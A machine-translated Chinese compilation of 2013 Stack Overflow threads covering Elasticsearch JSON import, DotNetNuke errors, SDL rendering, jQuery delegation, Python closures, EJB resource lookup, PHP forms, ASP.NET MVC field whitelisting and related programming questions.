> 时间：2013-04-10T21:29:50.783

我有一种冲动在这里引用“在你发出的东西上要保守，在你发出的东西上要自由”的原则。我会考虑将“我自己的”对象（在模块中使用）的设计设置为“一成不变”，但要轻松地对跨越模块边界的对象进行类型检查。使用适配器或其他一些显式模式来扩展内部类的行为总是可行的，而不是临时附加它。

# json - 将 JSON 文件导入/索引到 Elasticsearch

> ID：15936616
> 
> 赞同：96
> 
> 时间：2013-04-10T21:18:48.013
> 
> 标签：json, elasticsearch

我是 Elasticsearch 的新手，到目前为止一直在手动输入数据。例如我做了这样的事情：

```
$ curl -XPUT 'http://localhost:9200/twitter/tweet/1' -d '{
    "user" : "kimchy",
    "post_date" : "2009-11-15T14:12:12",
    "message" : "trying out Elastic Search"
}' 
```

我现在有一个 .json 文件，我想将它索引到 Elasticsearch 中。我也尝试过这样的事情，但没有成功：

```
curl -XPOST 'http://jfblouvmlxecs01:9200/test/test/1' -d lane.json 
```

如何导入 .json 文件？我需要先采取哪些步骤来确保映射正确吗？

* * *

## 回答 #1

> 赞同：95
> 
> 时间：2013-04-10T21:37:45.420

如果您想使用带有 curl 的文件，正确的命令是：

```
curl -XPOST 'http://jfblouvmlxecs01:9200/test/_doc/1' -d @lane.json 
```

Elasticsearch 是无模式的，因此您不一定需要映射。如果您按原样发送 json 并使用默认映射，则每个字段都将使用[标准分析器](http://www.elasticsearch.org/guide/reference/index-modules/analysis/standard-analyzer/)进行索引和分析。

如果你想通过命令行与 Elasticsearch 交互，你可能想看看应该比 curl 更方便一点的 elasticshell [。](http://github.com/javanna/elasticshell)

2019-07-10：应注意自定义[映射类型](https://www.elastic.co/guide/en/elasticsearch/reference/current/removal-of-types.html)已弃用且不应使用。我更新了上面 url 中的类型，以便更容易看出哪个是索引，哪个是类型，因为两者都命名为“test”是令人困惑的。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2014-11-13T00:36:25.770

根据当前文档，[https](https://www.elastic.co/guide/en/elasticsearch/reference/current/docs-bulk.html) ://www.elastic.co/guide/en/elasticsearch/reference/current/docs-bulk.html ：

> 如果您向 curl 提供文本文件输入，则必须使用 --data-binary 标志而不是普通的 -d。后者不保留换行符。

例子：

```
$ curl -s -XPOST localhost:9200/_bulk --data-binary @requests 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2014-11-18T03:32:50.510

我们为这种类型的东西制作了一个小工具[https://github.com/taskrabbit/elasticsearch-dump](https://github.com/taskrabbit/elasticsearch-dump)

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2017-05-01T14:40:08.310

我没有看到任何人提到的一件事：对于“纯” JSON 文件的每一行，JSON 文件必须有一行指定下一行所属的索引。

IE

```
{"index":{"_index":"shakespeare","_type":"act","_id":0}}
{"line_id":1,"play_name":"Henry IV","speech_number":"","line_number":"","speaker":"","text_entry":"ACT I"} 
```

没有它，什么都行不通，它不会告诉你为什么

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2018-03-16T20:29:06.660

我是 elasticsearch_loader 的作者，
我为这个确切的问题编写了 ESL。

您可以使用 pip 下载它：

```
pip install elasticsearch-loader 
```

然后您将能够通过发出以下命令将 json 文件加载到 elasticsearch 中：

```
elasticsearch_loader --index incidents --type incident json file1.json file2.json 
```

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2018-05-05T11:42:32.487

我只是确保我与 json 文件位于同一目录中，然后简单地运行它

```
curl -s -H "Content-Type: application/json" -XPOST localhost:9200/product/default/_bulk?pretty --data-binary @product.json 
```

因此，如果您也确保您在同一目录中并以这种方式运行它。注意：命令中的 product/default/ 是特定于我的环境的。您可以省略它或将其替换为与您相关的任何内容。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2016-05-18T15:51:12.443

添加到KenH的答案

```
$ curl -s -XPOST localhost:9200/_bulk --data-binary @requests 
```

您可以替换`@requests`为`@complete_path_to_json_file`

注意：`@`在文件路径之前很重要

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2016-10-12T04:35:40.153

只需从[https://www.getpostman.com/docs/environments](https://www.getpostman.com/docs/environments)获取邮递员，使用 /test/test/1/_bulk?pretty 命令为其提供文件位置。 [![在此处输入图像描述](https://i.stack.imgur.com/PLzVP.png)](https://i.stack.imgur.com/PLzVP.png)

* * *

## 回答 #9

> 赞同：6
> 
> 时间：2017-06-14T05:33:27.853

您正在使用

```
$ curl -s -XPOST localhost:9200/_bulk --data-binary @requests 
```

如果“请求”是一个 json 文件，那么您必须将其更改为

```
$ curl -s -XPOST localhost:9200/_bulk --data-binary @requests.json 
```

现在在此之前，如果你的 json 文件没有被索引，你必须在 json 文件中的每一行之前插入一个索引行。你可以用 JQ 做到这一点。请参阅以下链接： http: [//kevinmarsh.com/2014/10/23/using-jq-to-import-json-into-elasticsearch.html](http://kevinmarsh.com/2014/10/23/using-jq-to-import-json-into-elasticsearch.html)

转到 elasticsearch 教程（例如莎士比亚教程）并下载使用的 json 文件示例并查看它。在每个 json 对象（每个单独的行）前面都有一个索引行。这就是您在使用 jq 命令后要查找的内容。这种格式是使用批量 API 所必需的，普通的 json 文件不起作用。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2020-06-08T09:19:37.860

从 Elasticsearch 7.7 开始，您还必须指定内容类型：

```
curl -s -H "Content-Type: application/json" -XPOST localhost:9200/_bulk --data-binary @<absolute path to JSON file> 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2018-12-14T09:11:43.563

我编写了一些代码来通过文件系统 API 公开 Elasticsearch API。

例如，明确导出/导入数据是个好主意。

我创建了**原型** [elasticdriver](https://github.com/YaroslavGaponov/elasticdriver)。它基于[FUSE](https://www.wikiwand.com/en/Filesystem_in_Userspace)

[![演示](https://i.stack.imgur.com/in7U8.gif)](https://i.stack.imgur.com/in7U8.gif)

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2020-10-01T13:07:55.107

*   如果您使用的是弹性搜索 7.7 或更高版本，请执行以下命令。

    `curl -H "Content-Type: application/json" -XPOST "localhost:9200/bank/_bulk? pretty&refresh" --data-binary @"/Users/waseem.khan/waseem/elastic/account.json"`

*   上面的文件路径是`/Users/waseem.khan/waseem/elastic/account.json`.

*   如果您使用的是弹性搜索 6.x 版本，则可以使用以下命令。

`curl -X POST localhost:9200/bank/_bulk?pretty&refresh --data-binary @"/Users/waseem.khan/waseem/elastic/account.json" -H 'Content-Type: application/json'`

**注意**：确保在最后的**.json**文件中添加一个空行，否则会出现异常。

```
"error" : {
"root_cause" : [
  {
    "type" : "illegal_argument_exception",
    "reason" : "The bulk request must be terminated by a newline [\n]"
  }
],
"type" : "illegal_argument_exception",
"reason" : "The bulk request must be terminated by a newline [\n]"
},
`enter code here`"status" : 400 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2014-02-24T10:35:14.020

如果您在其中使用 VirtualBox 和 UBUNTU，或者您只是在使用 UBUNTU，那么它会很有用

```
wget https://github.com/andrewvc/ee-datasets/archive/master.zip
sudo apt-get install unzip (only if unzip module is not installed)
unzip master.zip
cd ee-datasets
java -jar elastic-loader.jar http://localhost:9200 datasets/movie_db.eloader 
```

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2020-12-09T08:56:52.593

如果要将 json 文件导入 Elasticsearch 并创建索引，请使用此 Python 脚本。

```
import json
from elasticsearch import Elasticsearch

es = Elasticsearch([{'host': 'localhost', 'port': 9200}])
i = 0
with open('el_dharan.json') as raw_data:
    json_docs = json.load(raw_data)
    for json_doc in json_docs:
            i = i + 1
            es.index(index='ind_dharan', doc_type='doc_dharan', id=i, body=json.dumps(json_doc)) 
```

# dotnetnuke - DNN 发生错误

> ID：15936618
> 
> 赞同：0
> 
> 时间：2013-04-10T21:18:54.787
> 
> 标签：dotnetnuke

有没有办法获取有关此错误的详细信息？我关闭了自定义错误：

![在此处输入图像描述](https://i.stack.imgur.com/nkWi2.png)

看起来我缺少一个皮肤文件。我该如何取回它？我使用了默认安装的 DNN 6.2.4 中的那个。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-11T06:04:25.440

您可以查看您的 DotNetNuke log4net 配置设置并检查您记录错误的位置。默认位置是**{DotNetNuke_Root_Folder}/Portals/_default/Logs/**。

默认情况下，日志级别设置为错误，因此您可以根据需要将其更改为**“调试”** ，方法是更改**以下配置文件**{DotNetNuke_Root_Folder}/DotNetNuke.log4net.config中的元素****

 **您可以将 DotNetNuke 安装 zip 文件中的皮肤文件夹复制到已安装的 DotNetNuke 网站。皮肤路径**(DotNetNuke_Community_07.00.05_Install.zip\Portals_default\Skins)**

希望这可以帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-12T04:08:59.157

您可以从 DotNetNuke 的 LogViewer 模块获取所有错误详细信息

以管理员身份登录，然后转到**Admin-Event Viewer**，在这里您可以找到有关错误的详细信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-05T20:37:14.950

我也有这个错误；在本地实例上。通过 .visx 文件安装 DNN 模板后，IIS 为 desktopmodules 文件夹设置了一个虚拟目录。在我的情况下，删除虚拟目录清除了这一点。花了很长时间进行故障排除，所以希望这可以帮助某人避免追逐野鹅。**

# c++ - 在屏幕上绘制表面时出现巨大的帧率下降

> ID：15936619
> 
> 赞同：0
> 
> 时间：2013-04-10T21:19:04.620
> 
> 标签：c++, sdl

我刚刚开始在 SDL 中制作另一个小游戏，我制作了我的 2 个玩家 - 以圆圈的上半部分为代表。到目前为止，我画了一个背景，两个玩家在上面。

```
if (SDL_Init(SDL_INIT_VIDEO) < 0 ) return 1;
    if (!(screen = SDL_SetVideoMode(WIDTH, HEIGHT, DEPTH,SDL_HWSURFACE| SDL_DOUBLEBUF)))
    {
        SDL_Quit();
        return 1;
    }

    SDL_Surface* surface2 = SDL_CreateRGBSurface(SDL_HWSURFACE, WIDTH, HEIGHT, 32,
                                   rmask, gmask, bmask, amask);

    SDL_FillRect(surface2, 0, SDL_MapRGBA(surface2->format,0,0xAA,0,0xFF));

        //in the while loop
        SDL_BlitSurface(surface2,0,screen,0); 
```

当我移动播放器时，它每次移动移动 10px。我已经使用计时器实现了平滑运动，所以情况并非如此。有趣的是，当我选择让surface2 保持黑色时——一开始没有填充矩形，那么一切都很顺利。我现在用一种颜色填充屏幕表面，它运行起来也很流畅。那么可能是什么问题呢？

# javascript - 通过 ajax 添加的链接与初始 DOM 中存在的链接的行为不同

> ID：15936622
> 
> 赞同：0
> 
> 时间：2013-04-10T21:19:24.240
> 
> 标签：javascript, jquery

当用户单击链接时，我正在使用它来生成 AJAX 调用。

```
$('a').not('.noajax').click(function(event) {
  event.preventDefault();
  AJAXLoad($(this).attr('href'));
}); 
```

`AJAXLoad`用于为某些 DIV 生成新内容。问题是，当我生成具有链接的新内容时，新生成的链接的行为与我对上述代码的期望不同。

我知道这可能是由于新添加的内容没有旧属性（遇到与 shadowbox 插件图像链接类似的问题）这一事实造成的，但我在 JS 方面不够熟练，无法修改我的代码以使其正常工作。有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:30:06.110

您需要使用事件委托。

```
$(document).delegate("a:not(.noajax)","click",function(e){
    // do stuff
}) 
```

或 1.7.2+

```
$(document).on("click","a:not(.noajax)",function(e){
    // do stuff
}) 
```

您还应该替换`document`为您用作目标的任何元素`AJAXLoad`。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-10T21:22:41.560

`$.click(function() {})`仅适用于在评估该行代码时页面上存在的元素。

你想用`$.live('click', function() {})`

`$.live()`将注意出现的任何新元素，它应该适用于。

* * *

编辑：明确说明-

```
$('a').not('.noajax').live('click', function(event) {
    event.preventDefault();
    AJAXLoad($(this).attr('href'));
}); 
```

# python - 如何深度复制函数对象

> ID：15936626
> 
> 赞同：4
> 
> 时间：2013-04-10T21:19:56.277
> 
> 标签：python, deep-copy

我创建了一个函数，它返回一个变量指定的值。喜欢

```
y = 1.
def f(x):
    return y 
```

我需要这个函数作为函数对象来创建另一个对象

```
dist = dist.distribution(f, other_variables) 
```

这很好用。但是，如果我想创建几个不同的分布对象（在 y 变化的意义上具有不同的函数 f）喜欢

```
dist = dist.distribution(f, other_variables)
y = 2.
dist2 = dist.distribution(f, other_variables) 
```

那么所有的分布对象只返回最后一个指定的值 y。IE

```
dist.f()(1.)
>>>> 2.
dist2.f()(1.)
>>>> 2. 
```

而不是预期的

```
dist.f()(1.)
>>>> 12.
dist2.f()(1.)
>>>> 2. 
```

问题显然是，函数 f 仅在被调用时才访问变量，而不是最初一次。

有办法解决吗？最后我想要的是：一个只有一个变量的函数（x，虽然在这种情况下它没有做任何事情，但在其他情况下需要它），它返回创建分布时的 y 值。所以原则上我希望在初始化分布时，给定的函数是深度复制的，从某种意义上说，它不再受任何变量变化的影响。这可能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-10T21:22:28.743

不要为此使用全局变量。也不需要“深度复制”该功能；*全局根本*`y`不是函数状态的一部分。

 *改用提供范围值的函数工厂，或使用 a`functools.partial()`为函数提供默认参数。

功能工厂：

```
def produce_f(y):
    def f(x):
        return y
    return f

dist = dist.distribution(produce_f(1.), other_variables) 
```

Now`y`是 的作用域值`f`，每次调用时都`produce_f()`返回一个*新* 值，并存储为 的单元格变量。`f``y``f`

演示：

```
>>> f1 = produce_f(12.)
>>> f2 = produce_f(42.)
>>> f1('foo')
12.0
>>> f2('foo')
42.0 
```

使用[`functools.partial()`](http://docs.python.org/3/library/functools.html#functools.partial)：

```
from functools import partial

def f(y, x):
    return y

dist = dist.distribution(partial(f, 1.), other_variables) 
```

这里`partial(f, 1.)`产生了一个新的可调用对象，它将在调用`f(1., ...)`时调用，并附加传入的任何额外参数。

演示：

```
>>> f1 = partial(f, 12.)
>>> f2 = partial(f, 42.)
>>> f1('foo')
12.0
>>> f2('foo')
42.0 
```*

# websphere - EJB3 中的资源引用

> ID：15936635
> 
> 赞同：0
> 
> 时间：2013-04-10T21:20:23.527
> 
> 标签：websphere, ejb-3.0, resourcereference

可能这是一个常见问题，我正在尝试使用 Websphere 7.0 中数据源的资源引用创建无状态会话 EJB 3.0。

以下代码正在工作：

```
package com;
import javax.ejb.Stateless;
import javax.annotation.Resource;
import javax.sql.DataSource;
@Stateless
public class Test1 implements Test1Remote {
 @Resource DataSource ds;
 public Test1() {}
 public boolean testDs() {
  boolean valid = true;
  try {
   ds.getConnection();
  } catch (Exception e) {
   e.printStackTrace();
   valid = true;
  }
  return valid;
 }
} 
```

```
<?xml version="1.0" encoding="UTF-8"?>
<ejb-jar-bnd
    xmlns="http://websphere.ibm.com/xml/ns/javaee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://websphere.ibm.com/xml/ns/javaee 
    http://websphere.ibm.com/xml/ns/javaee/ibm-ejb-jar-bnd_1_0.xsd" version="1.0">

    <session name="Test1">
     <interface class="com.Test1Remote" binding-name="Test1"/>
     <resource-ref name="com.Test1/ds" binding-name="jdbc/myDataSource"></resource-ref>
    </session>
</ejb-jar-bnd> 
```

以下代码不起作用，并给了我异常

```
javax.naming.NameNotFoundException: Name comp/env/jdbc not found in context "java:". 
```

但不确定当需要在 EJB 之外的 initialContext 中查找数据源时如何进行。

```
package com;
import javax.ejb.Stateless;
@Stateless
public class Test1 implements Test1Remote {
    public Test1() {
    }
    public boolean testDs(){
     boolean valid = true;
     try {
         MyConnection ds = new MyConnection();
         ds.getConnection();
     } catch (Exception e) {
        e.printStackTrace();
        valid = true;
    }
    return valid;
    }
}

package com;
import java.sql.Connection;
import java.sql.SQLException;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.sql.DataSource;

public class MyConnection{
    private DataSource ds;
    public Object getConnection() throws Exception  {
 try {
    final InitialContextinitCtx = new InitialContext();
    ds = (DataSource) initCtx.lookup("java:comp/env/jdbc/myDataSource");
    return ds.getConnection();
    } catch (NamingException e) {
     e.printStackTrace();
     throw e;
    } catch (SQLException e) {
     e.printStackTrace();
     throw e;
    }
 }
}

<?xml version="1.0" encoding="UTF-8"?>
<ejb-jar-bnd
    xmlns="http://websphere.ibm.com/xml/ns/javaee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://websphere.ibm.com/xml/ns/javaee 
    http://websphere.ibm.com/xml/ns/javaee/ibm-ejb-jar-bnd_1_0.xsd" version="1.0">

    <session name="Test1">
     <interface class="com.Test1Remote" binding-name="Test1"/>
    </session>
</ejb-jar-bnd> 
```

如果我在数据源查找中不使用“java:comp/env/”，那么它可以正常工作，但这不是一个好习惯。

更新：感谢您的回复。我的目标是将现有的 EJB 2.1 替换为 EJB 3.0。当前的 EJB 2.1 的设计类似于代码片段 2，所以我编写了这个测试。EJB 2.1 使用在 ejb 之外定义的资源运行（但在 ejb-jar.xml 中声明了资源引用）。如果我不遵循相同的方法，那么它将产生我想避免的巨大影响。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T16:46:04.793

Replace `@Resource` with `@Resource(name="jdbc/myDataSource")` and it should work.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T13:15:53.093

您将不得不使用驻留在服务器中的资源的 JNDI 名称（即：java:comp/env/jdbc/myDataSource）。JNDI 名称是资源的唯一标识符。无论是独立的 java 还是容器驱动的 java，都没有其他办法。如果您使用的是 EJB，那么您可以使用注释并引用资源，但仍然会在您提到 JNDI 名称的绑定文件中查找该资源。无论哪种方式，您都必须使用资源的 JNDI 名称。

**答案已更新**

如果您使用的是 EJB，那么只需使用注释来访问您第一次所做的资源。你正在做的是一个不好的做法。因为 EJB 是在容器中加载和维护的。没有保证 DataSource POJO 将在 EJB 调用它之前由类加载器加载。两者都有不同的生命周期。所以让容器为你注入资源。这是正确的做法。因此，EJB 依赖于 POJO 是一种不好的做法。在 Java EE 中不推荐。

# php - 在表格中每行添加一个 php 按钮

> ID：15936639
> 
> 赞同：0
> 
> 时间：2013-04-10T21:20:45.723
> 
> 标签：php, mysql, post, button

我正在尝试构建一个非常基本的表来显示查询结果，并允许将 ID 从一行（使用该行上的按钮选择）发布到另一个 php 表单以进一步编辑条目。一个非常基本的待办事项列表。

我已经能够制作一个漂亮的表格，但是对于如何将 TaskID 值从数组中获取到表单的值中有些困难。

紧接在表格上方和下方的是 ?> 和

有人能指出我的逻辑缺陷吗？我试过使用中间变量 $tmp 但这什么也没做。我已经用谷歌搜索并搜索过，但不确定如何实现这一点。我不是很好的 java 和 ajax，所以我在网上发现的许多其他解决方案都没有成功。

```
$result = mysql_query("SELECT * FROM Tasks WHERE ISNULL(AssignedTo)") 
or die(mysql_error());  

echo "<table border='1'>";
echo "<tr> <th>ID</th> 
  <th>Name</th> 
  <th>Priority</th> 
  <th>Description</th> 
  <th>Location</th> 
  <th>Location2</th> 
  <th>Update this Entry</th></tr>";

while($row = mysql_fetch_array( $result )) 
{

$tmp=$row['TaskID'];
echo "<tr><td>"; 
echo $row['TaskID'];
echo "<td>"; 
echo $row['TaskName'];
echo "<td>"; 
echo $row['TaskPriority'];
echo "<td>"; 
echo $row['TaskDesc'];
echo "<td>"; 
echo $row['TaskContainer'];
echo "<td>"; 
echo $row['TaskContainerIdentifier'];
echo "<td>"; 
?>

   <form name="form" method="POST" action="form_updatetask.php">
     <input value=$tmp type="hidden" name="search">
     <input type="submit"  value="Update">
   </form>

<?php
}
   echo "</td></tr>";
echo "</table>";
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:22:08.087

您混合了 html 和 php，这很好，但在您的 html 中您使用了一个变量。这显然必须在`<?php ?>`标签内。您还需要像这样回显该值：

```
<input value="<?php echo $tmp;?>" type="hidden" name="search"> 
```

所以你的代码看起来像这样：

```
$result = mysql_query("SELECT * FROM Tasks WHERE ISNULL(AssignedTo)") 
or die(mysql_error());  

echo "<table border='1'>";
echo "<tr> <th>ID</th> 
  <th>Name</th> 
  <th>Priority</th> 
  <th>Description</th> 
  <th>Location</th> 
  <th>Location2</th> 
  <th>Update this Entry</th></tr>";

while($row = mysql_fetch_array( $result )) 
{

$tmp=$row['TaskID'];
echo "<tr><td>"; 
echo $row['TaskID'];
echo "<td>"; 
echo $row['TaskName'];
echo "<td>"; 
echo $row['TaskPriority'];
echo "<td>"; 
echo $row['TaskDesc'];
echo "<td>"; 
echo $row['TaskContainer'];
echo "<td>"; 
echo $row['TaskContainerIdentifier'];
echo "<td>"; 
?>

   <form name="form" method="POST" action="form_updatetask.php">
     <input value="<?php echo $tmp;?>" type="hidden" name="search">
     <input type="submit"  value="Update">
   </form>

<?php
}
   echo "</td></tr>";
echo "</table>";
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:33:10.343

PHP 是一种允许您进入和退出解析器并包含未处理原始文本的部分（有时是长部分）的语言。PHP`<?php … ?>`块之外的任何内容都被视为纯文本并按原样输出。

您的表格中有这一行：

```
<input value=$tmp type="hidden" name="search"> 
```

这将完全显示在您呈现的 HTML 中，因为整行存在于 PHP 代码解析器的范围之外。要在代码中输出变量，您需要将其括在`<?php … ?>`标签中并回显如下值：

```
<input value=<?php echo $tmp ?> type="hidden" name="search"> 
```

如果您在启用了 5.4+ 或 short_open_tags 的服务器上，则可以使用以下较短的语法：

```
<input value=<?=$tmp?> type="hidden" name="search"> 
```

此外，最好始终将 HTML 属性值括在引号中，因此我建议您使用此行以确保完整性：

```
<input value="<?php echo $tmp ?>" type="hidden" name="search"> 
```

最后一点，这些`mysql_*`功能已（半）弃用，因此不再推荐使用。PHP 附带了一个速度更快的库，称为 MySQL 改进扩展（或 MySQLi），它与您正在使用的库大体相似，但具有`mysqli_connect`、`mysqli_select_db`、`mysqli_query`等，并且可用的功能范围更大。我建议您在项目中尽快切换到使用这些功能，因为仅性能和安全优势就值得。

> 参考：
> 
> *   [http://uk1.php.net/mysqli](http://uk1.php.net/mysqli)

# c# - 选择性地将要绑定的模型字段列入白名单

> ID：15936641
> 
> 赞同：2
> 
> 时间：2013-04-10T21:20:48.037
> 
> 标签：c#, asp.net-mvc, model

（我意识到这个问题与如何在 ModelBinder/UpdateModel 方法中将子对象字段列入白名单/黑名单非常相似[？](https://stackoverflow.com/questions/957840/how-to-whitelist-blacklist-child-object-fields-in-the-modelbinder-updatemodel-me)但我的情况略有不同，现在可能有更好的解决方案，但当时还没有。）

我们公司销售的基于 Web 的软件可由最终用户极其可配置。这种灵活性的本质意味着我们必须在*运行时*做一些通常在编译时做的事情。

关于谁拥有对大多数内容的读或读/写访问权限，有一些相当复杂的规则。

例如，采用我们想要创建的这个模型：

```
using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace j6.Business.Site.Models
{
    public class ModelBindModel
    {
        [Required]
        [Whitelist(ReadAccess = true, WriteAccess = true)]
        public string FirstName { get; set; }

        [Whitelist(ReadAccess = true, WriteAccess = true)]
        public string MiddleName { get; set; }

        [Required]
        [Whitelist(ReadAccess = true, WriteAccess = true)]
        public string LastName { get; set; }

        [Required]
        [Whitelist(ReadAccess = User.CanReadSalary, WriteAccess = User.CanWriteSalary)]
        public string Salary { get; set; }

        [Required]
        [Whitelist(ReadAccess = User.CanReadSsn, WriteAccess = User.CanWriteSsn)]
        public string Ssn { get; set; }

        [Required]
        public string SirNotAppearingOnThisPage { get; set; }
    }
} 
```

在控制器中，手动“解绑”东西并不难。

```
var resetValue = null;
modelState.Remove(field);

pi = model.GetType().GetProperty(field);
if (pi == null)
{
    throw new Exception("An exception occured in ModelHelper.RemoveUnwanted.  Field " +
    field  +
    " does not exist in the model " + model.GetType().FullName);
}
// Set the default value.
pi.SetValue(model, resetValue, null); 
```

使用 HTML 助手，我可以轻松访问模型元数据并禁止呈现用户无权访问的任何字段。

踢球者：我不知道如何在**CONTROLLER**本身的任何地方访问模型元数据以防止过度发布。

请注意，使用 [Bind(Include...)] 不是功能解决方案，至少在没有额外支持的情况下不是。要包含的属性取决于运行时（而不是编译时），并且排除该属性不会*将*其从验证中删除。

`ViewData.Model`是`null`
`ViewData.ModelMetaData`是`null`

```
[AllowAnonymous]
[HttpPost]
// [Bind(Exclude = "Dummy1" + ",Dummy2")]        
public ViewResult Index(ModelBindModel dto)
{   
    zzz.ModelHelper.RemoveUnwanted(ModelState, dto, new string[] {"Salary", "Ssn"});

    ViewBag.Method = "Post";
    if (!ModelState.IsValid)
    {
        return View(dto);
    }
    return View(dto);
} 
```

关于如何从控制器访问模型元数据的任何建议？还是在运行时将属性列入白名单的更好方法？

* * *

更新：

我从这个相当优秀的资源中借了一个页面：http:
[//www.dotnetcurry.com/ShowArticle.aspx?ID=687](http://www.dotnetcurry.com/ShowArticle.aspx?ID=687)

使用如下所示的模型：

```
[Required]
[WhiteList(ReadAccessRule = "Nope", WriteAccessRule = "Nope")]
public string FirstName { get; set; }

[Required]
[WhiteList(ReadAccessRule = "Database.CanRead.Key", WriteAccessRule = "Database.CanWrite.Key")]
public string LastName { get; set; } 
```

班上：

```
public class WhiteList : Attribute
{
    public string ReadAccessRule { get; set; }
    public string WriteAccessRule { get; set; }

    public Dictionary<string, object> OptionalAttributes()
    {
        var options = new Dictionary<string, object>();
        var canRead = false;

        if (ReadAccessRule != "")
        {
            options.Add("readaccessrule", ReadAccessRule);
        }

        if (WriteAccessRule != "")
        {
            options.Add("writeaccessrule", WriteAccessRule);
        }

        if (ReadAccessRule == "Database.CanRead.Key")
        {
            canRead = true;
        }

        options.Add("canread", canRead);
        options.Add("always", "be there");

        return options;
    }
} 
```

并将这些行添加到链接中提到的 MetadataProvider 类中：

```
var whiteListValues = attributes.OfType<WhiteList>().FirstOrDefault();

if (whiteListValues != null)
{
    metadata.AdditionalValues.Add("WhiteList", whiteListValues.OptionalAttributes());
} 
```

最后，系统的核心：

```
public static void DemandFieldAuthorization<T>(ModelStateDictionary modelState, T model)
{

    var metaData = ModelMetadataProviders
        .Current
        .GetMetadataForType(null, model.GetType());

    var props = model.GetType().GetProperties();

    foreach (var p in metaData.Properties)
    {
        if (p.AdditionalValues.ContainsKey("WhiteList"))
        {
            var whiteListDictionary = (Dictionary<string, object>) p.AdditionalValues["WhiteList"];

            var key = "canread";
            if (whiteListDictionary.ContainsKey(key))
            {
                var value = (bool) whiteListDictionary[key];
                if (!value)
                {
                    RemoveUnwanted(modelState, model, p.PropertyName);
                }
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:39:29.930

回顾一下我对您问题的解释：

*   字段访问是动态的；有些用户可能能够写入某个字段，而有些则不能。
*   您有一个解决方案可以在视图中控制它。
*   您希望防止恶意表单提交发送受限属性，然后模型绑定器会将这些属性分配给您的模型。

也许是这样的？

```
// control general access to the method with attributes
[HttpPost, SomeOtherAttributes]
public ViewResult Edit( Foo model ){

    // presumably, you must know the user to apply permissions?
    DemandFieldAuthorization( model, user );    

    // if the prior call didn't throw, continue as usual
    if (!ModelState.IsValid){
        return View(dto);
    }

    return View(dto);
}

private void DemandFieldAuthorization<T>( T model, User user ){

    // read the model's property metadata

    // check the user's permissions

    // check the actual POST message

    // throw if unauthorized
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:37:27.667

大约一年前，我写了一个扩展方法，从那以后我已经好几次了。我希望这对您有所帮助，尽管这可能不是您的完整解决方案。它本质上只允许对发送到控制器的表单上存在的字段进行验证：

```
internal static void ValidateOnlyIncomingFields(this ModelStateDictionary modelStateDictionary, FormCollection formCollection)
{
    IEnumerable<string> keysWithNoIncomingValue = null;
    IValueProvider valueProvider = null;

    try
    {
        // Transform into a value provider for linq/iteration.
        valueProvider = formCollection.ToValueProvider();

        // Get all validation keys from the model that haven't just been on screen...
        keysWithNoIncomingValue = modelStateDictionary.Keys.Where(keyString => !valueProvider.ContainsPrefix(keyString));

        // ...and clear them.
        foreach (string errorKey in keysWithNoIncomingValue)
            modelStateDictionary[errorKey].Errors.Clear();

    }
    catch (Exception exception)
    {
        Functions.LogError(exception);
    }

} 
```

用法：

```
ModelState.ValidateOnlyIncomingFields(formCollection); 
```

当然，您的 ActionResult 声明中需要一个 FormCollection 参数：

```
public ActionResult MyAction (FormCollection formCollection) { 
```

# java - 做两次 PRG，如何在历史上获取旧属性而不是新属性

> ID：15936645
> 
> 赞同：0
> 
> 时间：2013-04-10T21:21:07.287
> 
> 标签：java, session, spring-mvc, post-redirect-get

我遇到了一个需要 PRG 修复的问题，在这里得到了解答： [how to manage session attributes due to post requests, and history](https://stackoverflow.com/questions/15888258/how-to-manage-session-attributes-due-to-post-requests-and-history/15889159?noredirect=1#15889159)

但是，我似乎还有另一个问题。一旦初始 PRG 发生，假设我执行相同的 PRG 以向用户显示*不同*的客户。用户查看这个新客户，并在点击后退按钮时显示前一页/客户就好了。我的问题是会话中存储的将是**最新**的客户 ID，而不是前一个。

我考虑在我的控制器中再创建两个方法来反映我为 PRG 制作的前两个方法，但这需要创建更多视图，以便用户不访问任何其他会话属性相关的数据/模块/视图。

我使用 PRG 和发布请求的唯一原因是因为我想安全地发送所有数据并隐藏。

老实说，我不知道如何解决这个问题，因为我不知道在单击后退按钮时提出请求的任何方式。我应该放弃 PRG 方法吗？我应该改用什么？有没有办法让 PRG 工作，以便后退按钮的行为类似于获取请求？

# java - 使用监听器和匿名类——最佳实践？

> ID：15936646
> 
> 赞同：0
> 
> 时间：2013-04-10T21:21:12.277
> 
> 标签：java, android, listener

我目前正在开发我的第三个 Android 项目以进行大规模发布。与我目前的应用程序相比，我的前两个相对基本，这是迄今为止我最复杂的工作。因此，我不得不与比我习惯的更多的听众打交道。

具体来说，我的应用程序中处理在 MediaPlayer 中播放网络流的部分已经使用了三个侦听器。

微调器的侦听器：

```
